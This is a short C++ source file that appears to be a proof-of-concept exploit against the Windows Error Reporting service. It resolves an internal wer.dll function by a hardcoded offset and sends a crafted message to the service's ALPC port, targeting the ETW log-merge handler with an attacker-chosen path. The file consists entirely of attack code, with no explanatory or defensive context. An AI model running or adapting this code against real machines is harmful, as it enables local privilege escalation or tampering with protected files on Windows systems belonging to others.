#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <stdint.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
typedef __int64(__fastcall* _WersvcSendMessage)(PCWSTR SourceString, struct _WERSVC_MSG* a2, struct _WERSVC_MSG* a3, int a4);

struct _WERSVC_MSG {
	unsigned int v;
	char unknown[36];
	unsigned int requestCode;
	int u1;
	wchar_t path[0x100]  ;
	char unknown3[0x600];
};
_WERSVC_MSG a2; 
_WERSVC_MSG a3; 
int _tmain(int argc, _TCHAR* argv[])
{
	

	memset(&a2, 0, sizeof(_WERSVC_MSG));
	memset(&a3, 0, sizeof(_WERSVC_MSG));
	a2.v = 0x5780550;
	a2.requestCode = 0xF0020002;

	wcscpy_s( a2.path , argv[1]);
	HMODULE dll = LoadLibraryW(L"wer.dll");
	if (dll == (HMODULE)0) {
		printf("LoadLibraryW Error %d ", GetLastError());
		return 0;
	}
	else {
		printf("[+] Base 0x%x\n", dll);
	}
	// get function WersvcSendMessage addr 
	_WersvcSendMessage WersvcSendMessage = (_WersvcSendMessage)((unsigned long long)dll + 0x1A9A0);

	// call function wersvc!CWerService::SvcMergeETWLogs
	__int64 retval = WersvcSendMessage(L"\\WindowsErrorReportingServicePort", &a2, &a3, 80000);
	printf("Retval : %lld",retval);
	return 0;

}